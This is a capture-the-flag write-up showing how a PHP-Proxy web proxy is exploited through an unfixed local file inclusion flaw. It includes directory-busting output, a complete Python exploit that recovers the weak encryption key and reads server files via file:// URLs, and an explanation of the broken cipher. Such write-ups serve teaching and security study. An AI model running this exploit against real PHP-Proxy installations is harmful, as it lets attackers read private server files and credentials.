---
description: N-day Local File Inclusion (LFI) vulnerability in PHP-Proxy.
---

# Space Station

## Description

Where do you want to go?

`http://20.198.209.142:55047`

_The flag is in the flag format: STC{...}_

**Author: zeyu2001**

## Solution

Going to the given site only shows `Hello Mars!`.

![](<../../.gitbook/assets/Screenshot 2021-07-24 at 11.03.46 AM.png>)



Performing a simple directory busting scan, we find some interesting information.

```
└─# gobuster dir -u http://20.198.209.142:55047/ -w /usr/share/dirb/wordlists/common.txt -k -x .txt,.php --threads 10
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://20.198.209.142:55047/
[+] Threads:        10
[+] Wordlist:       /usr/share/dirb/wordlists/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,php
[+] Timeout:        10s
===============================================================
2021/07/23 23:06:33 Starting gobuster
===============================================================
/.hta (Status: 403)
/.hta.php (Status: 403)
/.hta.txt (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.txt (Status: 403)
/.htpasswd.php (Status: 403)
/.htaccess (Status: 403)
/.htaccess.txt (Status: 403)
/.htaccess.php (Status: 403)
/app (Status: 301)
/flag.txt (Status: 403)
/index.php (Status: 200)
/index.php (Status: 200)
/server-status (Status: 403)
===============================================================
2021/07/23 23:06:52 Finished
===============================================================
```

We find a `/flag.txt`, but we cannot view it. Let's keep in mind that the flag is in web root for now. 

![](<../../.gitbook/assets/Screenshot 2021-07-24 at 11.09.17 AM.png>)

Going to `/app` gives us a web proxy application.

![](<../../.gitbook/assets/Screenshot 2021-07-24 at 11.11.57 AM.png>)

We can enter any URL, and the corresponding page will be rendered on our browser. At the bottom of the page, we find that this application is "Powered by PHP-Proxy" and a [link](https://www.php-proxy.com) is given.

![](<../../.gitbook/assets/Screenshot 2021-07-24 at 11.14.36 AM.png>)

This link leads us to the GitHub repository, where a search for Issues containing the word "vulnerability" yields several results.

![](<../../.gitbook/assets/Screenshot 2021-07-24 at 11.15.00 AM.png>)

A currently open and unfixed issue is that PHP-Proxy (all versions) suffers from a Local File Inclusion (LFI) vulnerability: [https://github.com/Athlon1600/php-proxy-app/issues/135](https://github.com/Athlon1600/php-proxy-app/issues/135). We can also find more details here: [https://github.com/0xUhaw/CVE-Bins/tree/master/PHP-Proxy](https://github.com/0xUhaw/CVE-Bins/tree/master/PHP-Proxy)

### The Exploit

The exploit script is already provided in the GitHub issue above.

```python
import requests
import base64

def encrypt(plaintext, key):
    key_length = len(key)
    key_as_int = [ord(i) for i in key]
    plaintext_int = [ord(i) for i in plaintext]
    ciphertext = []
    for i in range(len(plaintext_int)):
        value = (plaintext_int[i] + key_as_int[i % key_length]) % 256
        ciphertext.append(value)
    return bytes(ciphertext)

def calculate_key(ciphertext, plaintext):
    key = []
    for i in range(0, len(ciphertext)):
        if ciphertext[i] - ord(plaintext[i]) < 0:
            key.append(chr(ciphertext[i] - ord(plaintext[i]) + 256))
        else:
            key.append(chr(ciphertext[i] - ord(plaintext[i])))

    return "".join(key[:32])

def exploit(url, file_to_read):
    r = requests.post(url + '/index.php', data={'url': 'http://aaaaaaaaaaaaaaaaaaaaaaaaaaa.com'}, allow_redirects=False)

    b64_url_ciphertext = r.headers['location'].split('?q=')[1]
    b64_url_ciphertext = b64_url_ciphertext + "=" * (len(b64_url_ciphertext) % 4)
    url_ciphertext = base64.b64decode(b64_url_ciphertext)
    url_plaintext = 'http://aaaaaaaaaaaaaaaaaaaaaaaaaaa.com'

    key = calculate_key(url_ciphertext, url_plaintext)
    return requests.get(url + '/index.php', params={'q': base64.b64encode(encrypt(file_to_read, key))}).text

print(exploit('http://20.198.209.142:55047/app', 'file:///var/www/html/flag.txt'))
```

Running the script gives us the flag, `STC{l0cal_f1l3_1nclus10n_328d47c2ac5b2389ddc47e5500d30e04}`

![](<../../.gitbook/assets/Screenshot 2021-07-24 at 11.24.34 AM.png>)

To understand why the exploit works, read on below!

### The Vulnerability

When visiting a page through PHP-Proxy, the `q=` parameter is used. This is the URL we are visiting, encrypted using an app key in the package configuration.

The encryption key is generated as follows:

```php
Config::set('encryption_key', md5(Config::get('app_key').$_SERVER['REMOTE_ADDR']));
```

The URL is encrypted as follows:

```php
$url = str_rot_pass($url, $key);
```

The following encryption function is not secure enough. It simply takes every character of the key and adds it to the original plaintext. Since we know both the plaintext (the original URL) and the ciphertext (the `q=` parameter), we can easily reverse-engineer the key.

```php
// rotate each string character based on corresponding ascii values from some key
function str_rot_pass($str, $key, $decrypt = false){

    // if key happens to be shorter than the data
    $key_len = strlen($key);

    $result = str_repeat(' ', strlen($str));

    for($i=0; $i<strlen($str); $i++){

        if($decrypt){
            $ascii = ord($str[$i]) - ord($key[$i % $key_len]);
        } else {
            $ascii = ord($str[$i]) + ord($key[$i % $key_len]);
        }

        $result[$i] = chr($ascii);
    }

    return $result;
}
```

Then, after getting the key, it is simply a matter of encrypting `file:///var/www/html/flag.txt` since the `file://` protocol is not explicitly banned.
